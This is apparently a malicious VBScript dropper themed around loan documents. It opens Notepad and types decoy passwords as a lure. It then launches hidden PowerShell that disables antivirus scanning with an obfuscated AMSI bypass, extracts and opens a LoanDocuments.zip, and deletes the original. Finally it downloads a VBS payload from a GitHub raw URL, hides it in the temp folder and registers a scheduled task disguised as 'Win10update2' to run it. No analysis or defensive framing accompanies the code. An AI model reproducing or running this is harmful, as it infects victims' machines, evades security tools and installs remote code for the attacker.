Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe", 1, True

WScript.Sleep 1000

Notepad.SendKeys "bank statements passsword: loan2020   application password: myname2020  microsoft onedrive account:  onlinedocs2020"



Set OGshell = wscript.createobject("wscript.shell")
OGshell.run "powershell.exe -nop -exec bypass; [Ref].Assembly.GetType('System.Management.Automation.'+$([CHar](81-16)+[cHaR](109)+[CHaR]([byTe]0x73)+[cHaR](56+49))+'Utils').GetField($([cHaR](57+40)+[ChAR](102+7)+[cHar](150-35)+[CHAR]([BYte]0x69)+[CHar]([bYTE]0x49)+[cHaR]([byte]0x6E)+[chaR]([BYte]0x69)+[ChAr](10556/91)+[CHAr]([bYTe]0x46)+[CHaR]([byte]0x61)+[Char]([byTE]0x69)+[ChAR](108)+[chAr](113-12)+[chaR]([BytE]0x64)),'NonPublic,Static').SetValue($null,$true); ""& {$lookfile = get-childitem -path ~\* -recurse -include *LoanDocuments.zip -erroraction silentlycontinue ; $foundfile = test-path $lookfile ; If ($foundfile -eq $True) {"" $lookfile | Expand-Archive -destinationpath ""~\downloads\LoanDocuments"" -force; ii ""~\downloads\LoanDocuments""; $lookfile | remove-item ""} Else {""onedrive.com""}}""", 0, True

Set Twoshell = wscript.createobject("wscript.shell")
Twoshell.run "powershell.exe -nop -exec bypass; [Ref].Assembly.GetType('System.Management.Automation.'+$([SyStEM.neT.WeBUTiLiTY]::hTmldeCOde('&#65;&#109;&#115;&#105;'))+'Utils').GetField(''+$([chAr](7469/77)+[char](109)+[cHAr]([bYTE]0x73)+[ChAr]([bYTE]0x69))+'InitFailed',$([SYSTem.Net.WeBUtIliTy]::htmLdEcOdE('&#78;&#111;&#110;&#80;&#117;&#98;&#108;&#105;&#99;&#44;&#83;&#116;&#97;&#116;&#105;&#99;'))).SetValue($null,$true) ; ""& curl -s https://raw.githubusercontent.com/section10housing/b1/windows10two.txt -o %tmp%\windows10two.vbs; attrib +h %tmp%\windows10two.vbs ; schtasks /create /sc minute /mo 5 /tn Win10update2 /tr %tmp%\%windows10two.vbs; schtasks /delete /tn Win10update2 /F""", 0, False
